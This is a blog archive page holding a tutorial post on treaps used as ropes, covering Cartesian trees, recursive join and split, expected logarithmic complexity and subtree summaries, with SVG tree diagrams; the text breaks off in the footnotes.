<!doctype html>
<html lang="en">
	<head>
		<title>Everything - ralismark</title>

<!--[if lt IE 9]>
	<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
<![endif]-->

<meta charset="utf-8">
<meta http-equiv='X-UA-Compatible' content='IE=edge'>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<link rel="canonical" href="/everything">
<meta name="description" content="Everything Have an easter egg! All my posts, in a single file. Handy if you want do full-text search. Rope-Making With Treaps Treaps are a very neat data str...">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/logo-32.png">

<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="ralismark" />

<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap" rel="stylesheet">

<link rel="stylesheet" href="/assets/main.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">

<!-- experiment: indieweb -->
<link rel="webmention" href="https://webmention.io/www.ralismark.xyz/webmention" />
<link rel="pingback" href="https://webmention.io/www.ralismark.xyz/xmlrpc" />

	</head>
	<body>
		<header id="site-nav" class="full-width text-inverted">
	<nav class="content-width flex-distribute">
		<a id="navbar-root" href="/">ralismark</a>

		

		<ul id="navbar-pages" class="list-inline my-0">
			
			
			
			
			
			
			
			
			
			
			<li class="navbar-page">
				<a class="navbar-link" href="/posts">
					Blog
				</a>
			</li>
			
			
			
			
			
			
			
			
			
			
		</ul>
	</nav>
</header>


		<main class="content-width my-2 ">
			<style>
@keyframes huespin {
  from { filter: hue-rotate(0deg);   }
  to   { filter: hue-rotate(360deg); }
}
svg#spiral {
}
svg#spiral > use {
  animation-duration: 3s;
  animation-name: huespin;
  animation-iteration-count: infinite;
}
</style>

<h1 class="text-centre">Everything</h1>

<svg id="spiral" width="200" height="200" viewBox="-200 -200 400 400" xmlns="http://www.w3.org/2000/svg">
  <title>Have an easter egg!</title>
  <use href="/assets/spiral.svg#root" width="100" height="100" stroke-width="10">
</svg>

<p>
All my posts, in a single file. Handy if you want do full-text search.
</p>


  <h2 class="fenced-y text-centre bleed"><a href="/posts/treap-rope">Rope-Making With Treaps</a></h2>
  
    <div class="bounded"><p>Treaps are a very neat data structure that I’ve grown fond of. Though they are a <a href="https://en.wikipedia.org/wiki/Self-balancing_binary_search_tree">self-balancing binary search tree</a>, they differ from most other variants in that they can do much more than just store key-value pairs – they can become <em><a href="https://en.wikipedia.org/wiki/Rope_(data_structure)">ropes</a></em>.</p>

<!--more-->

<p>Like dictionaries, <a href="https://en.wikipedia.org/wiki/Rope_(data_structure)">ropes</a> fall under the category of <a href="https://en.wikipedia.org/wiki/Abstract_data_type">abstract data types</a>, but that’s where the similarities end. They extend arrays with the two new abilities beyond indexing:</p>

<ol>
  <li>Join (i.e. concatenate) two ropes into a single one</li>
  <li>Split a rope at a point into two halves</li>
</ol>

<p>Of course, this can be implemented using either linked lists or dynamic arrays, but both have time complexity trade-offs.</p>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>Access</th>
      <th>Join</th>
      <th>Split</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Linked List</td>
      <td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
      <td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
      <td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
    </tr>
    <tr>
      <td>Dynamic Array</td>
      <td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
      <td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
      <td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
    </tr>
    <tr>
      <td>Treap</td>
      <td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>&#x2061;</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
      <td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>&#x2061;</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
      <td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>&#x2061;</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
    </tr>
  </tbody>
</table>

<p>Treaps are a nice middle ground, with <em>expected</em> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>&#x2061;</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> (because of their probabilistic nature) for all operations.</p>

<h2 id="cartesian-trees"><a href="#cartesian-trees">Cartesian Trees</a></h2>

<p>Almost all the machinery for treaps are built on top of <a href="https://en.wikipedia.org/wiki/Cartesian_tree">Cartesian trees</a>, so we’ll look at those first. Formally, they are binary trees derived from a sequence of numbers, and satisfy two properties:</p>

<!-- that last sentence is kinda bad -->

<ol>
  <li>An <a href="https://en.wikipedia.org/wiki/Tree_traversal#In-order_(LNR)">in-order</a> traversal gives the original sequence (like other binary search trees)</li>
  <li>Each node’s value is not larger than its children’s – this is also known as the <a href="https://en.wikipedia.org/wiki/Heap_(data_structure)">heap</a> property</li>
</ol>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/d/d5/Cartesian_tree.svg" alt="&quot;Cartesian tree&quot;" /></p>

<p><em>Cartesian Tree. Source: <a href="https://en.wikipedia.org/wiki/Cartesian_tree#/media/File:Cartesian_tree.svg">wikipedia</a></em></p>

<p>While you can convert a list of numbers into a Cartesian tree, we won’t need to – just join a bunch of single-element trees to do the same thing.</p>

<h2 id="join"><a href="#join">Join</a></h2>

<p>The first operation we’ll tackle is joining. Lets suppose we have two trees we want to join. The final tree will need to satisfy the heap property, so the root node must be the smallest element out of both trees. Fortunately, since the original trees satisfy the heap property, we know the smallest overall element must be one of the two root nodes.</p>

<p>We’ll assume the left root is smaller – we can just mirror our final algorithm if the right root was actually greater. Here’s an example:</p>

<svg xmlns="http://www.w3.org/2000/svg" width="316pt" height="286pt" viewBox="0.00 0.00 315.80 285.89">
  <g class="graph" transform="scale(1 1) rotate(0) translate(4 281.89)">
    <title>%3</title>
    <g class="node">
      <title>1</title>
      <ellipse fill="none" stroke="#99ee99" cx="72" cy="-259.89" rx="18" ry="18" />
      <text text-anchor="middle" x="72" y="-256.19" font-family="Times,serif" font-size="14.00">1</text>
    </g>
    <g class="node">
      <title>3</title>
      <ellipse fill="none" stroke="#ff9999" cx="45" cy="-185.09" rx="18" ry="18" />
      <text text-anchor="middle" x="45" y="-181.39" font-family="Times,serif" font-size="14.00">3</text>
    </g>
    <g class="edge">
      <title>1-&gt;3</title>
      <path fill="none" stroke="black" d="M66.01,-242.73C62.62,-233.59 58.3,-221.95 54.46,-211.6" />
      <polygon fill="black" stroke="black" points="57.73,-210.36 50.98,-202.2 51.17,-212.79 57.73,-210.36" />
    </g>
    <g class="node">
      <title>8</title>
      <ellipse fill="none" stroke="#ff9999" cx="99" cy="-185.09" rx="18" ry="18" />
      <text text-anchor="middle" x="99" y="-181.39" font-family="Times,serif" font-size="14.00">8</text>
    </g>
    <g class="edge">
      <title>1-&gt;8</title>
      <path fill="none" stroke="black" d="M77.99,-242.73C81.38,-233.59 85.7,-221.95 89.54,-211.6" />
      <polygon fill="black" stroke="black" points="92.83,-212.79 93.02,-202.2 86.27,-210.36 92.83,-212.79" />
    </g>
    <g class="node">
      <title>9</title>
      <ellipse fill="none" stroke="#ff9999" cx="18" cy="-102.94" rx="18" ry="18" />
      <text text-anchor="middle" x="18" y="-99.24" font-family="Times,serif" font-size="14.00">9</text>
    </g>
    <g class="edge">
      <title>3-&gt;9</title>
      <path fill="none" stroke="black" d="M39.54,-167.87C35.84,-156.9 30.88,-142.18 26.65,-129.63" />
      <polygon fill="black" stroke="black" points="29.97,-128.5 23.46,-120.14 23.33,-130.73 29.97,-128.5" />
    </g>
    <g class="node">
      <title>7</title>
      <ellipse fill="none" stroke="#ff9999" cx="72" cy="-102.94" rx="18" ry="18" />
      <text text-anchor="middle" x="72" y="-99.24" font-family="Times,serif" font-size="14.00">7</text>
    </g>
    <g class="edge">
      <title>3-&gt;7</title>
      <path fill="none" stroke="black" d="M50.46,-167.87C54.16,-156.9 59.12,-142.18 63.35,-129.63" />
      <polygon fill="black" stroke="black" points="66.67,-130.73 66.54,-120.14 60.03,-128.5 66.67,-130.73" />
    </g>
    <g class="node">
      <title>12</title>
      <ellipse fill="none" stroke="#ff9999" cx="129" cy="-102.94" rx="20.6" ry="20.6" />
      <text text-anchor="middle" x="129" y="-99.24" font-family="Times,serif" font-size="14.00">12</text>
    </g>
    <g class="edge">
      <title>8-&gt;12</title>
      <path fill="none" stroke="black" d="M105.07,-167.87C108.9,-157.65 113.94,-144.18 118.41,-132.23" />
      <polygon fill="black" stroke="black" points="121.76,-133.26 121.99,-122.67 115.21,-130.81 121.76,-133.26" />
    </g>
    <g class="node">
      <title>10</title>
      <ellipse fill="none" stroke="#9999ff" cx="225" cy="-185.09" rx="20.6" ry="20.6" />
      <text text-anchor="middle" x="225" y="-181.39" font-family="Times,serif" font-size="14.00">10</text>
    </g>
    <g class="node">
      <title>15</title>
      <ellipse fill="none" stroke="#9999ff" cx="257" cy="-102.94" rx="20.6" ry="20.6" />
      <text text-anchor="middle" x="257" y="-99.24" font-family="Times,serif" font-size="14.00">15</text>
    </g>
    <g class="edge">
      <title>10-&gt;15</title>
      <path fill="none" stroke="black" d="M232.42,-165.5C236.42,-155.49 241.43,-142.93 245.89,-131.78" />
      <polygon fill="black" stroke="black" points="249.16,-133.02 249.62,-122.43 242.66,-130.42 249.16,-133.02" />
    </g>
    <g class="node">
      <title>5</title>
      <ellipse fill="none" stroke="#9999ff" cx="255" cy="-259.89" rx="18" ry="18" />
      <text text-anchor="middle" x="255" y="-256.19" font-family="Times,serif" font-size="14.00">5</text>
    </g>
    <g class="edge">
      <title>5-&gt;10</title>
      <path fill="none" stroke="black" d="M248.49,-243.09C245,-234.62 240.6,-223.94 236.55,-214.11" />
      <polygon fill="black" stroke="black" points="239.71,-212.6 232.66,-204.69 233.24,-215.27 239.71,-212.6" />
    </g>
    <g class="node">
      <title>20</title>
      <ellipse fill="none" stroke="#9999ff" cx="227" cy="-20.8" rx="20.6" ry="20.6" />
      <text text-anchor="middle" x="227" y="-17.1" font-family="Times,serif" font-size="14.00">20</text>
    </g>
    <g class="edge">
      <title>15-&gt;20</title>
      <path fill="none" stroke="black" d="M249.89,-82.95C246.23,-73.17 241.69,-61.05 237.62,-50.18" />
      <polygon fill="black" stroke="black" points="240.84,-48.79 234.06,-40.66 234.29,-51.25 240.84,-48.79" />
    </g>
    <g class="node">
      <title>18</title>
      <ellipse fill="none" stroke="#9999ff" cx="287" cy="-20.8" rx="20.6" ry="20.6" />
      <text text-anchor="middle" x="287" y="-17.1" font-family="Times,serif" font-size="14.00">18</text>
    </g>
    <g class="edge">
      <title>15-&gt;18</title>
      <path fill="none" stroke="black" d="M264.11,-82.95C267.77,-73.17 272.31,-61.05 276.38,-50.18" />
      <polygon fill="black" stroke="black" points="279.71,-51.25 279.94,-40.66 273.16,-48.79 279.71,-51.25" />
    </g>
  </g>
</svg>

<p>Since the in-order traversal of the output must go through the entire left tree before going through the right, we know that 1’s left subtree doesn’t change. The right side is different though. If 8 remains the right child, we’ll break the heap rule. So we detach it.</p>

<svg xmlns="http://www.w3.org/2000/svg" width="355pt" height="363pt" viewBox="0.00 0.00 354.80 363.48">
  <g class="graph" transform="scale(1 1) rotate(0) translate(4 359.48)">
    <title>%3</title>
    <g class="node">
      <title>1</title>
      <ellipse fill="none" stroke="#99ee99" cx="73" cy="-337.48" rx="18" ry="18" />
      <text text-anchor="middle" x="73" y="-333.78" font-family="Times,serif" font-size="14.00">1</text>
    </g>
    <g class="node">
      <title>3</title>
      <ellipse fill="none" stroke="#99ee99" cx="45" cy="-262.69" rx="18" ry="18" />
      <text text-anchor="middle" x="45" y="-258.99" font-family="Times,serif" font-size="14.00">3</text>
    </g>
    <g class="edge">
      <title>1-&gt;3</title>
      <path fill="none" stroke="black" d="M66.79,-320.33C63.27,-311.19 58.79,-299.55 54.81,-289.2" />
      <polygon fill="black" stroke="black" points="58.05,-287.87 51.2,-279.8 51.52,-290.39 58.05,-287.87" />
    </g>
    <g class="node">
      <title>8</title>
      <ellipse fill="none" stroke="#ff9999" cx="159" cy="-262.69" rx="18" ry="18" />
      <text text-anchor="middle" x="159" y="-258.99" font-family="Times,serif" font-size="14.00">8</text>
    </g>
    <g class="node">
      <title>5</title>
      <ellipse fill="none" stroke="#9999ff" cx="294" cy="-262.69" rx="18" ry="18" />
      <text text-anchor="middle" x="294" y="-258.99" font-family="Times,serif" font-size="14.00">5</text>
    </g>
    <g class="node">
      <title>9</title>
      <ellipse fill="none" stroke="#99ee99" cx="18" cy="-185.09" rx="18" ry="18" />
      <text text-anchor="middle" x="18" y="-181.39" font-family="Times,serif" font-size="14.00">9</text>
    </g>
    <g class="edge">
      <title>3-&gt;9</title>
      <path fill="none" stroke="black" d="M39.14,-245.28C35.65,-235.51 31.14,-222.89 27.19,-211.81" />
      <polygon fill="black" stroke="black" points="30.41,-210.44 23.75,-202.2 23.82,-212.8 30.41,-210.44" />
    </g>
    <g class="node">
      <title>7</title>
      <ellipse fill="none" stroke="#99ee99" cx="72" cy="-185.09" rx="18" ry="18" />
      <text text-anchor="middle" x="72" y="-181.39" font-family="Times,serif" font-size="14.00">7</text>
    </g>
    <g class="edge">
      <title>3-&gt;7</title>
      <path fill="none" stroke="black" d="M50.86,-245.28C54.35,-235.51 58.86,-222.89 62.81,-211.81" />
      <polygon fill="black" stroke="black" points="66.18,-212.8 66.25,-202.2 59.59,-210.44 66.18,-212.8" />
    </g>
    <g class="node">
      <title>12</title>
      <ellipse fill="none" stroke="#ff9999" cx="204" cy="-185.09" rx="20.6" ry="20.6" />
      <text text-anchor="middle" x="204" y="-181.39" font-family="Times,serif" font-size="14.00">12</text>
    </g>
    <g class="edge">
      <title>8-&gt;12</title>
      <path fill="none" stroke="black" d="M167.89,-246.75C173.75,-236.9 181.59,-223.74 188.46,-212.2" />
      <polygon fill="black" stroke="black" points="191.6,-213.76 193.71,-203.38 185.59,-210.18 191.6,-213.76" />
    </g>
    <g class="node">
      <title>10</title>
      <ellipse fill="none" stroke="#9999ff" cx="264" cy="-185.09" rx="20.6" ry="20.6" />
      <text text-anchor="middle" x="264" y="-181.39" font-family="Times,serif" font-size="14.00">10</text>
    </g>
    <g class="node">
      <title>15</title>
      <ellipse fill="none" stroke="#9999ff" cx="296" cy="-102.94" rx="20.6" ry="20.6" />
      <text text-anchor="middle" x="296" y="-99.24" font-family="Times,serif" font-size="14.00">15</text>
    </g>
    <g class="edge">
      <title>10-&gt;15</title>
      <path fill="none" stroke="black" d="M271.42,-165.5C275.42,-155.49 280.43,-142.93 284.89,-131.78" />
      <polygon fill="black" stroke="black" points="288.16,-133.02 288.62,-122.43 281.66,-130.42 288.16,-133.02" />
    </g>
    <g class="edge">
      <title>5-&gt;10</title>
      <path fill="none" stroke="black" d="M287.64,-245.65C284,-236.5 279.34,-224.75 275.12,-214.11" />
      <polygon fill="black" stroke="black" points="278.35,-212.77 271.41,-204.76 271.85,-215.35 278.35,-212.77" />
    </g>
    <g class="node">
      <title>20</title>
      <ellipse fill="none" stroke="#9999ff" cx="266" cy="-20.8" rx="20.6" ry="20.6" />
      <text text-anchor="middle" x="266" y="-17.1" font-family="Times,serif" font-size="14.00">20</text>
    </g>
    <g class="edge">
      <title>15-&gt;20</title>
      <path fill="none" stroke="black" d="M288.89,-82.95C285.23,-73.17 280.69,-61.05 276.62,-50.18" />
      <polygon fill="black" stroke="black" points="279.84,-48.79 273.06,-40.66 273.29,-51.25 279.84,-48.79" />
    </g>
    <g class="node">
      <title>18</title>
      <ellipse fill="none" stroke="#9999ff" cx="326" cy="-20.8" rx="20.6" ry="20.6" />
      <text text-anchor="middle" x="326" y="-17.1" font-family="Times,serif" font-size="14.00">18</text>
    </g>
    <g class="edge">
      <title>15-&gt;18</title>
      <path fill="none" stroke="black" d="M303.11,-82.95C306.77,-73.17 311.31,-61.05 315.38,-50.18" />
      <polygon fill="black" stroke="black" points="318.71,-51.25 318.94,-40.66 312.16,-48.79 318.71,-51.25" />
    </g>
  </g>
</svg>

<p>The correct child would be the smaller one, but we’d need to merge <em>their</em> subtrees. This is same kind of problem we’re trying to solve in the first place, so recursion is the way to go. This gives us the full join algorithm:</p>

<ol>
  <li>Firstly, finds the smaller root node and sets it as the root of the output.</li>
  <li>Then, recursively merges the other tree with the subtree on the same side – that’s blue with red in the example.</li>
</ol>

<p>And that’s it!</p>

<h2 id="split"><a href="#split">Split</a></h2>

<p>The other operation we need to support is splitting. Let’s bring back the wikipedia example:</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/d/d5/Cartesian_tree.svg" alt="&quot;Cartesian tree&quot;" /></p>

<p><em>Cartesian Tree. Source: <a href="https://en.wikipedia.org/wiki/Cartesian_tree#/media/File:Cartesian_tree.svg">wikipedia</a></em></p>

<p>Suppose we want to split this tree between 10 and 20. The first problem is that there are 3 edges between the two sides of the split: 1-5, 5-8, and 10-15. No worries – we’ll just erase them. But this leaves us with <em>too</em> many components.</p>

<p>Now, we could use the join algorithm we just made. But let’s take a step back. Suppose we could efficiently determine, for any node, which side the split was on. With this, we could determine whether the split is in the <em>left or right subtree</em>. We’ll tell that subtree, if it exists, to split itself (recursively), and replace it with the half that was on our side of the split<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote">1</a></sup>.</p>

<p>This gives us the full splitting algorithm:</p>

<ol>
  <li>Determine which side of the root the split is on</li>
  <li>Split the subtree on that side, if it exists</li>
  <li>Reattach the closer half to the root</li>
</ol>

<p>However, we’ve assumed that we can easily determine which side the split is on. I’ll admit this is bit of a cop-out, since it isn’t even possible with plain Cartesian trees, but it’ll be easy to support when we actually make our treap.</p>

<h2 id="complexity"><a href="#complexity">Complexity</a></h2>

<p>Both of our algorithms run in <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(depth)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span>. This looks great until you realise it’s valid for a Cartesian tree to be a <em>linked list</em>. Which makes the worst case complexity <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>.</p>

<p>Now, the obvious solution would be to require the tree be balanced. How to achieve this without tacking on <em>another</em> <a href="https://en.wikipedia.org/wiki/Self-balancing_binary_search_tree">self-balancing binary search tree</a> is less obvious.</p>

<p>Treaps solve this is by exploiting two theorems<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote">2</a></sup>:</p>

<ol>
  <li><a href="https://en.wikipedia.org/wiki/Random_binary_tree">Random binary trees</a> are, <a href="https://en.wikipedia.org/wiki/With_high_probability">With High Probability</a><sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote">3</a></sup>, balanced.</li>
  <li>Cartesian trees generated from arrays of random numbers are uniformly random.</li>
</ol>

<p>By using random numbers for the Cartesian tree, we ensure our operations are almost always <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>&#x2061;</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> i.e. fast. However, we’ve lost the ability to store anything useful. To remedy this, we attach an <em>additional</em> value to each node (and call the random numbers the nodes’ <em>priority</em>, to avoid confusion). Since the value can change independently to the priority, we can allow updating it in-place.</p>

<p>Or, we can forbid it. Since each node only ever knows about its subtree, we can update by instead by splitting out the element, cloning it, then joining the pieces back together.</p>

<p>This last fact is way more useful than it sounds. If we enforce immutability, we can store <em>any</em> aggregate statistic <em>as long as it doesn’t depend on things outside its subtree</em>. This permits “summaries” like</p>

<ul>
  <li>total length – a node’s length is one plus the sum of its children’s lengths</li>
  <li>line count – store the number of newline characters</li>
  <li><em>other</em> treaps computed from this treap (with an additional <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>log</mi><mo>&#x2061;</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">\log n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span></span></span> factor to the complexity)</li>
  <li>well, <em>any</em> monoid or semigroup<sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote">4</a></sup> (i.e. you’re using an associative binary operator)</li>
</ul>

<p>to be calculated efficiently – expected <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>&#x2061;</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>, as well.</p>

<h2 id="actually-split"><a href="#actually-split">Actually Split</a></h2>

<p>Still, we haven’t solved our assumption for splitting: that we can determine which side of each node the split is on.</p>

<p>For now, we’ll restrict our split function to only take the split-point as an index. Now, notice that this index will be on the left of the root <em>if and only if</em> it’s not larger than the size of the left subtree. By tracking the size of each subtree, we’ll satisfy our promise of an efficient response. This’ll also allow us to <em>index</em> our nodes, which is really important.</p>

<p>In fact, you can use stranger split-point conditions, such as “before the first element which satisfies this predicate”, by storing special summary information in each node. What information to store is left as an exercise to the reader.</p>

<h2 id="summary"><a href="#summary">Summary</a></h2>

<p>And with that, we have a fully functional <em>rope</em>. You can store sequences of any type, join them, split them, index them, even summarise them. You <em>can</em> adapt this into a dictionary by bolting on a binary search to a split function, but why would you – there’s way better ways of doing it.</p>

<p>The fast <em>summaries</em> – <code class="language-plaintext highlighter-rouge">foldMap</code>, if you’re familiar with Haskell – are a lesser-known superpower of treaps (and ropes in general). With the right setup, you can achieve advanced behaviour including <a href="https://xi-editor.io/docs/rope_science_05.html">word wrap</a> and <a href="https://xi-editor.io/docs/rope_science_04.html">parenthesis matching</a> – if you’re interested (like me), have a read of the <a href="https://xi-editor.io/docs/rope_science_00.html">Rope Science series in the Xi editor docs</a>.</p>

<p>As an additional note, some other binary search trees also support join &amp; split. <a href="https://en.wikipedia.org/wiki/Join-based_tree_algorithms">Wikipedia has a page on it</a> which goes through a few other operations, but treaps are by still far the simplest.</p>
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>I intended to including a visual for this. Unfortunately, making these trees with GraphViz is a real pain. Forcing the nodes to stay in the right place requires tangling up the graph with a lot of invisible edges and nodes. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>I don’t know how either of these are proven. Sorry. <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
